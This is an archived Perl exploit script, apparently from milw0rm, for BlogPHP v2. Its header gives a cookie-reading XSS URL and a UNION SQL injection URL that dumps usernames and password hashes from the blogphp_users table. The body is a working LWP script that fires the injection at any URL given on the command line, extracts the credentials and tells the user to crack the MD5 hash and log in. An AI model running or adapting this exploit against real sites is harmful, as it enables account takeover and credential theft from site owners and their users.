#!/usr/bin/perl
#####################################################################################
####                                 BlogPHP V.2                                 ####
####             Multiple Remote Vulnerabilities (SQL Injection Exploit/XSS)     ####
#####################################################################################
#                                                                                   #
#AUTHOR : IRCRASH                                                                   #
#Discovered by : Dr.Crash                                                           #
#Exploited By : Dr.Crash                                                            #
#IRCRASH Team Members : Dr.Crash - Malc0de - R3d.w0rm                               #
#                                                                                   #
#####################################################################################
#                                                                                   #
#Script Download : http://puzzle.dl.sourceforge.net/sourceforge/blogphpscript/BlogPHPv2.zip
#                                                                                   #
#####################################################################################
#                                   < XSS >                                         #
#XSS Address : http://Sitename/index.php?search=<script>alert(document.cookie);</script>
#                                                                                   #
#####################################################################################
#                                   < SQL >                                         #
#SQL Address : http://Sitename/index.php?act=page&id=999999999%27union/**/select/**/0,1,CoNcAt(0x4c6f67696e3a,username,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e),3,4/**/from/**/blogphp_users/*
#                                                                                   #
#####################################################################################
#                         Our site : Http://IRCRASH.COM                             #
#####################################################################################

use LWP;
use HTTP::Request;
use Getopt::Long;


sub header
{
print "
****************************************************
*        SBlogPHP v.2 Sql Injection exploit        *
****************************************************
*AUTHOR : IRCRASH                                  *
*Discovered by : Dr.Crash                          *
*Exploited by : Dr.Crash                           *
*Our Site : IRCRASH.COM                            *
****************************************************";
}

sub usage
{
  print "
* Usage : perl $0 -url http://Sitename/
****************************************************
";
}


my %parameter = ();
GetOptions(\%parameter, "url=s");

$url = $parameter{"url"};

if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url."/";}
if($url !~ /http:\/\//){$url = "http://".$url;}
$vul = "/index.php?act=page&id=999999999%27union/**/select/**/0,1,CoNcAt(0x4c6f67696e3a,username,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e),3,4/**/from/**/blogphp_users/*";
sub Exploit()
{
$requestpage = $url.$vul;
print "Requesting Page is ".$url."\n";

my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("http://IRCRASH.COM");
$req->content_type('application/x-www-form-urlencoded');
$req->header("content-length" => $contlen);
$req->content($poststring);

$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();

#Debug Modus delete # at beginning of next line
#print $content;

@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<enduser>/,$name);
$name = @name[0];

@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/<endpass>/,$password);
$password = @password[0];

if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed ! :(\n\n";
exit;
}

print "Username: ".$name."\n";
print "Password: " .$password."\n\n";
print "Crack Md5 Password And Login In : $url/login.html\n";
print "Enjoy My friend .....\n";

}

#Starting;
print "
****************************************************
*        SBlogPHP v.2 Sql Injection exploit        *
****************************************************
*AUTHOR : IRCRASH                                  *
*Discovered by : Dr.Crash                          *
*Exploited by : Dr.Crash                           *
*Our Site : IRCRASH.COM                            *
****************************************************";
print "\n\nExploiting...\n";
Exploit();

# milw0rm.com [2008-02-02]